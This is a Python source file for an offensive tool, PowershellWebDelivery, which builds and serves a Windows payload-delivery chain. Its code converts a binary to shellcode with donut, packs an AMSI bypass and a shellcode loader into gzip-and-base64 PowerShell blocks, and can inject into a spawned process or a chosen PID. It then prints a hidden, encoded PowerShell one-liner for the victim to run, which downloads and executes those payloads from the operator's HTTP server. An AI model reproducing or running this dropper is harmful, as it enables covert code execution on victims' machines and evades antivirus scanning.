import sys, getopt
import os
import random
import string
import subprocess
from io import BytesIO 
import gzip
import base64
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse


    
def generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1"):

    oneLinerToExecPath = os.path.join(Path(__file__).parent, "oneLinerToExec.template")
    oneLiner = open(oneLinerToExecPath, "rb").read()

    # output the oneliner to run on the victime
    script = oneLiner.replace(b"SCHEME", scheme.encode())
    script = script.replace(b"IP_WEBSERV", ip.encode())
    script = script.replace(b"PORT_WEBSERV", port.encode())
    script = script.replace(b"PAYLOAD_AMSI", amsiPath.encode("utf-8"))
    script = script.replace(b"PAYLOAD_SHELLCODE", shellcodeLoaderPath.encode("utf-8"))
    script_utf16 = script.decode("utf-8").encode("utf_16_le")
    base64_bytes = base64.b64encode(script_utf16)

#     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
    oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))

    return oneLiner


def generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid):

    if binary:
        print('binary ', binary)
        print('binaryArgs ', binaryArgs)
        print('')

        if os.name == 'nt':
                donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
                shellcodePath = os.path.join(Path(__file__).parent, '.\\shellcode.b64')
                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
        else:   
                donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
                shellcodePath = os.path.join(Path(__file__).parent, './shellcode.b64')
                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i', binary)
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        output = popen.stdout.read()
        
        print("[+] Generate shellcode of payload with donut")
        print(output.decode("utf-8") )

        shellcode = open(shellcodePath, "rb").read()
        os.remove(shellcodePath)

    elif rawShellCode:
        print('rawShellCode ', rawShellCode)
        print('')

        shellcode = open(rawShellCode, "rb").read()
        shellcode = base64.b64encode(shellcode)

        print(len(shellcode))

    AmsiBypassPath = os.path.join(Path(__file__).parent, "AmsiBypass.template")
    amsiBypass = open(AmsiBypassPath, "rb").read()

    if spawnProcess or pid:
        ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template.remoteInject")
        shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()
        
        print(spawnProcess)
        print(pid)
        if spawnProcess:
                spawnProcessCode = '''
$proc = Start-Process {} -PassThru
Start-Sleep -Milliseconds 500
$procPid = $proc.Id
        '''.format(spawnProcess)
                shellCodeLoader = shellCodeLoader.replace(b"PLACE_HOLDER", spawnProcessCode.encode("utf-8"))
        elif pid:
                injectPidCode = '''
$procPid = {}
        '''.format(str(pid))
                shellCodeLoader = shellCodeLoader.replace(b"PLACE_HOLDER", injectPidCode.encode("utf-8"))

    else:
        ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template")
        shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()

    # creat AMIS bypass payload
    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
    	f.write(amsiBypass)
    base64_bytes = base64.b64encode(out.getvalue())
    amsiOneLiner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))

    # creat Shellcode loader payload
    script = shellCodeLoader.replace(b"SHELL_CODE", shellcode)

    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
    	f.write(script)
    base64_bytes = base64.b64encode(out.getvalue())
    shellcodeLoaderOneliner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
    
    return amsiOneLiner, shellcodeLoaderOneliner


def getHelpExploration():
        helpMessage = '''
PowershellWebDelivery - Generate a PowerShell one-liner to download and execute a payload from a web server.

Usage:  
  Dropper PowershellWebDelivery listenerDownload listenerBeacon [options]
  Options:
  -s, --spawnProcess <name>   Name of a process to spawn and inject into (e.g., notepad.exe).
  -d, --pid <pid>             PID of an existing process to inject into.

Examples:
  # Serve and run the shellcode
  PowershellWebDelivery.py jj jj -s notepad.exe

  # Serve and inject shellcode into a newly spawned process
  PowershellWebDelivery.py jj jj -s notepad.exe

  # Serve and inject shellcode into a specific process by PID
  PowershellWebDelivery.py jj jj -d 1234

Notes:
- The generated PowerShell one-liner will be printed to the console.
- Use `-s` or `-d`, not both. If neither is provided the shellcode will self inject.
'''
        return helpMessage


def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):

        _ip, _port, _binary, _binaryArgs, _rawShellCode, spawnProcess, pid = parseCmdLine(aditionalArgs)

        if url[-1:] == "/":
                url = url[:-1]

        print('[+] Parse url')
        parsed_url = urlparse(url)
        schema = parsed_url.scheme
        ip = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (443 if schema == "https" else 80)

        print(" Schema:", schema)
        print(" IP Address:", ip)
        print(" Port:", port)
        print(" binary:", binary)
        print(" binaryArgs:", binaryArgs)
        print(" rawShellCode:", rawShellCode)
        print(" spawnProcess:", spawnProcess)
        print(" pid:", pid)

        # Generate payloads
        droppersPath = []
        shellcodesPath = []
        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid)

        filenameAmsi = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        amsiOneLinerPath = os.path.join(Path(__file__).parent, 'bin')
        amsiOneLinerPath = os.path.join(amsiOneLinerPath, filenameAmsi)
        
        # Write one liner to file
        f = open(amsiOneLinerPath, "w")
        f.truncate(0) 
        f.write(amsiOneLiner)
        f.close()

        filenameShellcode = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        shellcodeLoaderOnelinerPath = os.path.join(Path(__file__).parent, 'bin')
        shellcodeLoaderOnelinerPath = os.path.join(shellcodeLoaderOnelinerPath, filenameShellcode)
        
        # Write shellcode loader to file
        f = open(shellcodeLoaderOnelinerPath, "w")
        f.truncate(0) 
        f.write(shellcodeLoaderOneliner)
        f.close()
        
        # Gnerate oneliner to run on the target
        oneliner = generateOneLiner(ip, str(port), schema, parsed_url.path + "/" + filenameAmsi, parsed_url.path + "/" + filenameShellcode)

        shellcodesPath.append(amsiOneLinerPath)
        shellcodesPath.append(shellcodeLoaderOnelinerPath)

        print(droppersPath)
        print(shellcodesPath)
        print(oneliner)

        return droppersPath, shellcodesPath, oneliner


helpMessage = '''
PowershellWebDelivery - Generate a PowerShell one-liner to download and execute a payload from a web server.

Usage:
  PowershellWebDelivery.py -i <ip> -p <port> [options]

Options:
  -i, --ip <ip>               IP address or hostname of the server hosting the payload.
  -p, --port <port>           Port number to serve the payload.
  -b, --binary <path>         Path to the binary to serve and execute (e.g., ./calc.exe).
  -a, --args "<args>"         Optional arguments to pass to the binary upon execution.
  -r, --raw <path>            Path to raw shellcode (.raw file) to inject instead of a binary.
  -s, --spawnProcess <name>   Name of a process to spawn and inject into (e.g., notepad.exe).
  -d, --pid <pid>             PID of an existing process to inject into.
  -h                          Show this help message and exit.

Examples:
  # Serve and execute calc.exe with no arguments
  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe

  # Serve and execute calc.exe with arguments
  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "-winmode hide"

  # Serve and inject raw shellcode into a newly spawned process
  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -s notepad.exe

  # Serve and inject raw shellcode into a specific process by PID
  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -d 1234

Notes:
- The generated PowerShell one-liner will be printed to the console.
- Ensure the payload can be downloaded and executed on the target.
- Use `-b` or `-r`, not both.
- Use `-s` or `-d`, not both. If neither is provided the shellcode will self inject.
'''


def parseCmdLine(argv):
        
        ip=""
        port=""
        binary=""
        binaryArgs=""
        rawShellCode=""
        spawnProcess=""
        pid=""

        opts, args = getopt.getopt(argv,"hi:p:b:a:r:s:d:",["ip=","port=","binary=","args=","raw=","spawnProcess=","pid="])
        for opt, arg in opts:
                if opt == '-h':
                        print(helpMessage)
                        sys.exit()
                elif opt in ("-b", "--binary"):
                        binary = arg
                elif opt in ("-a", "--args"):
                        binaryArgs = arg
                elif opt in ("-i", "--ip"):
                        ip = arg
                elif opt in ("-p", "--port"):
                        port = arg
                elif opt in ("-r", "--raw"):
                        rawShellCode = arg
                elif opt in ("-s", "--spawnProcess"):
                        spawnProcess = arg
                elif opt in ("-d", "--pid"):
                        pid = arg

        return ip, port, binary, binaryArgs, rawShellCode, spawnProcess, pid


def main(argv):
        if(len(argv)<6):
                print(helpMessage)
                exit()

        ip, port, binary, binaryArgs, rawShellCode, spawnProcess, pid = parseCmdLine(argv)
        
        print('[+] Generate dropper for params:')
        print('ip ', ip)
        print('port ', port)

        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid)

        payloadAmsiPath = os.path.join(Path(__file__).parent, "./web/payloadAmsi.ps1")
        f1 = open(payloadAmsiPath, "w")
        f1.write(amsiOneLiner)
        f1.close()

        payloadShellcodePath = os.path.join(Path(__file__).parent, "./web/payloadShellcode.ps1")
        f2 = open(payloadShellcodePath, "w")
        f2.write(shellcodeLoaderOneliner)
        f2.close()

        oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="/payloadAmsi.ps1", shellcodeLoaderPath="/payloadShellcode.ps1")

        print(oneliner)
        
        print("[+] Web delivery on web server {} : {}".format(ip, port))
        os.chdir("./web")
        httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
        httpd.serve_forever()


if __name__ == "__main__":
        main(sys.argv[1:])

